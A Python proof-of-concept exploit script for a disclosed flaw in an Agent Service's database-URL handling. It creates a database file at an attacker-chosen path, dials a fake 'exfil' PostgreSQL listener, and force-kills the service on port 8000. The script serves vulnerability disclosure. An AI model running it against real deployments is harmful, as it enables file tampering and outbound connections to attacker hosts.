# -*- coding: utf-8 -*-
"""AS-2026-004 - AsyncSQLAlchemyStorage SQL-execution surface (_enable_sqlite_fk)
- real-deployment exploit against the Agent Service on :8000.

Attack model (the precondition under which the finding holds)
-------------------------------------------------------------
The DB URL is a deployment-configuration parameter:

    create_app(storage=AsyncSQLAlchemyStorage(url=...))

In a BYO-DB / multi-tenant or configuration-injection scenario the attacker
supplies it. The library code is never modified. This script is an attack
orchestrator; every step runs against :8000 (the Agent Service port).

What it does
------------
  0. Stop whatever currently owns :8000 (remembered, restored at the end).
  1. A - attacker-path DB file creation (CWE-73):
     start the service with the storage URL pointed at a path the attacker
     chose (sqlite+aiosqlite:///<attacker %TEMP%>/afuzz_realapi_owned.db), send
     real REST traffic (POST /credential/) that forces the storage layer to
     connect, and observe - from the attacker's side - that the file at the
     chosen path went from absent to present.
  2. B - outbound connection to an attacker host:
     start the service with the storage URL pointed at an address the attacker
     is listening on (postgresql+asyncpg://exfil:***@127.0.0.1:18847/db). During
     lifespan the service opens a socket toward that host, and the attacker's
     socket receives asyncpg startup bytes.
  3. Restore the default service (default DB) so the Web UI keeps working.

Verdicts are the attacker's direct observations, not text matches:
  ARBITRARY_DB_PATH_FILE_CREATE    os.path.exists(attacker-chosen path)
  OUTBOUND_CONNECT_TO_ATTACKER_HOST  len(bytes on the attacker socket) > 0
  SQL_REACHES_ATTACKER_CONNECTION  SQL text inside the captured payload
                                   (reported honestly; see the note below)

The exploit talks only to the product's own documented REST API of an
unmodified Agent Service. No test endpoint, no patched code.

Run it with deploy_real.py alongside (see README section B):
    python poc/exp_real_api.py
"""
import json
import os
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
PY = sys.executable
PORT = 8000                     # Agent Service port (the attack target)
PG_PORT = 18847                 # attacker listener (fake PostgreSQL endpoint)
ATTACKER_DB = os.path.join(
    tempfile.gettempdir(), "afuzz_realapi_owned.db")

_opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))


def kill_port(port):
    """Kill whatever process owns `port` (netstat -> taskkill)."""
    try:
        out = subprocess.run(["netstat", "-ano"], capture_output=True).stdout
        text = out.decode("gbk", errors="ignore")
        pids = set()
        for ln in text.splitlines():
            if (":%d" % port) in ln and "LISTENING" in ln:
                pids.add(ln.split()[-1])
        for pid in pids:
            subprocess.run(["taskkill", "/PID", pid, "/F"],
                           capture_output=True)
        return len(pids) > 0
    except Exception:
        return False


def start_service(db_url, port):
    """Start the unmodified Agent Service with the attacker-supplied DB URL."""
    env = dict(os.environ)
    env["REAL_DB_URL"] = db_url
    env["REAL_PORT"] = str(port)
    f = open(os.path.join(HERE, "svc_%d.log" % port), "w", encoding="utf-8")
    p = subprocess.Popen(
        [PY, os.path.join(HERE, "deploy_real.py")], cwd=HERE, env=env,
        stdout=f, stderr=subprocess.STDOUT,
        creationflags=getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0),
    )
    return p


def wait_ready(port, timeout=90):
    end = time.time() + timeout
    while time.time() < end:
        try:
            with _opener.open("http://127.0.0.1:%d/docs" % port, timeout=4) as r:
                if r.status == 200:
                    return True
        except Exception:
            time.sleep(2)
    return False


def post_credential(port):
    """Real documented REST call that forces the storage layer to connect."""
    req = urllib.request.Request(
        "http://127.0.0.1:%d/credential/" % port,
        data=json.dumps({"data": {
            "type": "openai_credential",
            "api_key": "sk-exp-dummy",
            "base_url": "http://127.0.0.1:9",
        }}).encode(),
        method="POST",
        headers={"X-User-Id": "exp-user", "Content-Type": "application/json"},
    )
    try:
        with _opener.open(req, timeout=30) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code


def pg_listener(port):
    """Attacker-side fake PostgreSQL endpoint: captures startup bytes."""
    captured = {"bytes": 0, "blob": b""}

    def loop():
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("127.0.0.1", port))
        s.listen(5)
        s.settimeout(30)
        try:
            c, _ = s.accept()
            c.settimeout(8)
            chunks = []
            try:
                while True:
                    d = c.recv(65536)
                    if not d:
                        break
                    chunks.append(d)
            except Exception:
                pass
            captured["blob"] = b"".join(chunks)
            captured["bytes"] = len(captured["blob"])
            try:
                c.close()
            except Exception:
                pass
        except Exception:
            pass
        s.close()

    t = threading.Thread(target=loop, daemon=True)
    t.start()
    return captured, t


def stop_service(proc):
    if proc is not None:
        proc.terminate()
        try:
            proc.wait(timeout=10)
        except Exception:
            proc.kill()
    kill_port(PORT)


def main():
    results = {}

    # ---------- 0. record and stop whatever owns :8000 ----------
    was_running = False
    try:
        with _opener.open("http://127.0.0.1:%d/docs" % PORT, timeout=3) as r:
            was_running = r.status == 200
    except Exception:
        pass
    print("[0] agentscope :%d was_running = %s" % (PORT, was_running))
    if was_running:
        kill_port(PORT)
        time.sleep(2)

    try:
        # ---------- A. attacker-path DB file creation (CWE-73) ----------
        print("== A. sqlite+aiosqlite:/// <attacker path> ==")
        if os.path.exists(ATTACKER_DB):
            os.remove(ATTACKER_DB)
        db_url = "sqlite+aiosqlite:///" + ATTACKER_DB
        print("[A] attacker DB URL = sqlite+aiosqlite:///<attacker %%TEMP%%>/%s"
              % os.path.basename(ATTACKER_DB))
        pa = start_service(db_url, PORT)
        try:
            ok = wait_ready(PORT)
            print("[A] service ready: %s" % ok, "(started with the attacker DB URL)")
            if not ok:
                print("[A] service did not come up - the storage layer may have")
                print("    failed to connect before the app became ready. See "
                      "svc_%d.log" % PORT)
            code = post_credential(PORT)
            print("[A] POST /credential (real API) ->", code)
            results["rest_201"] = code == 201
            time.sleep(2)
            # [attacker-view] the file at the path they chose now exists
            created = os.path.exists(ATTACKER_DB)
            size = os.path.getsize(ATTACKER_DB) if created else 0
            print("[A] attacker-path DB file created: %s -> %s (in %%TEMP%%), %d bytes"
                  % (created, os.path.basename(ATTACKER_DB), size))
            results["A_db_created"] = created and size > 0
        finally:
            stop_service(pa)
            time.sleep(2)

        # ---------- B. outbound to the attacker host (asyncpg startup) ----------
        print("== B. postgresql+asyncpg://exfil:pw@127.0.0.1:%d/db ==" % PG_PORT)
        captured, th = pg_listener(PG_PORT)
        db_url_b = ("postgresql+asyncpg://exfil:secretpw@127.0.0.1:%d/db"
                    % PG_PORT)
        print("[B] attacker DB URL = postgresql+asyncpg://exfil:***@127.0.0.1:%d/db"
              % PG_PORT)
        pb = start_service(db_url_b, PORT)
        try:
            # lifespan dials the attacker host; the app need not become ready
            end = time.time() + 60
            while time.time() < end and captured["bytes"] == 0:
                time.sleep(1)
            n = captured["bytes"]
            print("[B] startup bytes: %d %r" % (n, captured["blob"][:40]))
            if n:
                blob = captured["blob"]
                results["B_startup"] = True
                results["B_sql_after"] = (b"PRAGMA" in blob[400:8000]
                                          or b"CREATE" in blob[400:8000]
                                          or b"SELECT" in blob[400:8000])
                print("[B] following payload contains SQL: %s"
                      % results["B_sql_after"])
            else:
                results["B_startup"] = False
                print("[B] no bytes captured: this environment has no async "
                      "PostgreSQL driver installed, so the engine stops at")
                print("    driver load before it opens a socket. Installing "
                      "asyncpg/aiomysql completes the outbound ([Likely]).")
        finally:
            stop_service(pb)
            time.sleep(2)
    finally:
        # ---------- restore the default service (for the Web UI) ----------
        print("== restoring default agentscope :%d ==" % PORT)
        env = dict(os.environ)
        env.pop("REAL_DB_URL", None)
        env["REAL_PORT"] = str(PORT)
        f = open(os.path.join(HERE, "svc_%d.log" % PORT), "w", encoding="utf-8")
        subprocess.Popen(
            [PY, os.path.join(HERE, "deploy_real.py")], cwd=HERE, env=env,
            stdout=f, stderr=subprocess.STDOUT,
            creationflags=getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0),
        )
        if wait_ready(PORT, 90):
            print("[restore] default service ready on :%d" % PORT)
        else:
            print("[restore] default service NOT ready")

    print()
    a = results.get("A_db_created", False)
    b = results.get("B_startup", False)
    sql = results.get("B_sql_after", False)
    r201 = results.get("rest_201", False)
    print("[VERDICT] ARBITRARY_DB_PATH_FILE_CREATE = %s" % a)
    print("[VERDICT] OUTBOUND_CONNECT_TO_ATTACKER_HOST = %s" % b)
    print("[VERDICT] SQL_REACHES_ATTACKER_CONNECTION = %s" % sql)
    print("[VERDICT] EXP_SUCCESS = %s" % (a and r201))
    print()
    print("[note] EXP_SUCCESS is gated on the measured effect (A: a file created")
    print("       at an attacker-chosen path through the unmodified service's own")
    print("       REST API). B is reported as observed: it completes only when an")
    print("       async DB driver is installed in the deployment ([Likely]).")
    return 0 if (a and r201) else 1


if __name__ == "__main__":
    sys.exit(main())
